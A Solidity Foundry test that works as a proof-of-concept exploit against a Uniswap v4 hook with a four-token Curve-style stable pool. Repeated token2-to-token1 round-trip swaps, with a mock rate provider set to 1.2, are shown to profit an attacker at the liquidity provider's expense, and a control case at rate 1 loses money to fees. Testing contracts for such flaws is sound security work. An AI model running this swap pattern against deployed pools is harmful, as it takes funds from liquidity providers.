// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {RateProviderMock} from "contracts/test/balancer/v3/RateProviderMock.sol";
import {
    IUniswapV4StandardExchangeCurveQuadStableBufferHookPackage
} from "contracts/hooks/uniswap/v4/standardExchange/stable/quad/curve/interfaces/IUniswapV4StandardExchangeCurveQuadStableBufferHookPackage.sol";
import {TestBase_UniswapV4StandardExchangeCurveQuadStableBufferHook} from
    "contracts/hooks/uniswap/v4/standardExchange/stable/quad/curve/TestBase_UniswapV4StandardExchangeCurveQuadStableBufferHook.sol";

/// @notice rawleg-rp-swap, Curve quad family: raw leg1 with rate provider r (D60). Round trip t2->t1->t2.
contract RawLegRpSwapCurveQuad is TestBase_UniswapV4StandardExchangeCurveQuadStableBufferHook {
    address internal lp = address(0x1111);
    address internal attacker = address(0xA77ACC);
    RateProviderMock internal rp1;

    uint256 internal constant LP_EACH = 1_000_000 ether;
    uint256 internal constant ATK_CAPITAL = 50_000 ether;
    uint256 internal constant FEE = 1e15; // 0.1% (stable pool)

    function _deployRawRp(uint256 rate) internal {
        rp1 = new RateProviderMock();
        rp1.mockRate(rate);
        address[4] memory toks = [address(token0), address(token1), address(token2), address(token3)];
        address[4] memory ses;
        ses[0] = se0;
        address[4] memory rps;
        rps[1] = address(rp1);
        _deployHookWithArgs(_pkgArgs(toks, ses, rps, DEFAULT_BASE_AMP));
        _setUsageFee(0);
        _setDexFee(FEE);

        uint256[] memory amts = new uint256[](4);
        amts[0] = LP_EACH;
        amts[1] = LP_EACH * 1e18 / rate;
        amts[2] = LP_EACH;
        amts[3] = LP_EACH;
        token0.mint(lp, amts[0]);
        token1.mint(lp, amts[1]);
        token2.mint(lp, amts[2]);
        token3.mint(lp, amts[3]);
        vm.startPrank(lp);
        token0.approve(hook, type(uint256).max);
        token1.approve(hook, type(uint256).max);
        token2.approve(hook, type(uint256).max);
        token3.approve(hook, type(uint256).max);
        quad.joinProportional(amts, lp, 0, block.timestamp + 1 days);
        vm.stopPrank();
        console2.log("rp on raw leg1", quad.rateProvider(uint256(1)));
    }

    function _lpValue(uint256 rate) internal view returns (uint256 v) {
        uint256 shares = IERC20(hook).balanceOf(lp);
        bool[] memory f = new bool[](4);
        uint256[] memory out = quad.previewExitProportionalFlexible(shares, f);
        v = out[0] + out[1] * rate / 1e18 + out[2] + out[3];
    }

    function _attack(uint256 rate, uint256 loops) internal returns (int256 profit, int256 lpDelta) {
        uint256 lpBefore = _lpValue(rate);
        token2.mint(attacker, ATK_CAPITAL);
        vm.startPrank(attacker);
        token1.approve(hook, type(uint256).max);
        token2.approve(hook, type(uint256).max);
        for (uint256 k; k < loops; ++k) {
            uint256 inB = token2.balanceOf(attacker);uint256 got1 = IStandardExchangeIn(hook).exchangeIn(IERC20(address(token2)), inB, IERC20(address(token1)), 0, attacker, false, block.timestamp + 1
            );uint256 got2 = IStandardExchangeIn(hook).exchangeIn(IERC20(address(token1)), got1, IERC20(address(token2)), 0, attacker, false, block.timestamp + 1
            );
            console2.log("loop", k);
            console2.log("  token2 in       ", inB);
            console2.log("  token1 out      ", got1);
            console2.log("  fair token1 out ", inB * 1e18 / rate);
            console2.log("  token2 back     ", got2);
        }
        vm.stopPrank();
        uint256 fin = token2.balanceOf(attacker);
        profit = int256(fin) - int256(ATK_CAPITAL);
        uint256 lpAfter = _lpValue(rate);
        lpDelta = int256(lpAfter) - int256(lpBefore);
        console2.log("attacker capital  ", ATK_CAPITAL);
        console2.log("attacker final t2 ", fin);
        console2.log("attacker profit (t2, signed)");
        console2.logInt(profit);
        console2.log("LP value before (fair)", lpBefore);
        console2.log("LP value after  (fair)", lpAfter);
        console2.log("LP delta (signed)");
        console2.logInt(lpDelta);
    }

    function test_quad_exploit_rate_1_2() public {
        _deployRawRp(1.2e18);
        (int256 profit, int256 lpDelta) = _attack(1.2e18, 5);
        assertGt(profit, 0, "attacker profit");
        assertLt(lpDelta, 0, "LP loss");
        assertApproxEqAbs(uint256(-lpDelta), uint256(profit), 1e9, "LP loss == attacker profit");
    }

    function test_quad_control_rate_1() public {
        _deployRawRp(1e18);
        (int256 profit, int256 lpDelta) = _attack(1e18, 5);
        assertLt(profit, 0, "control: round trips lose fees");
        assertGt(lpDelta, 0, "control: LP earns fees");
    }
}
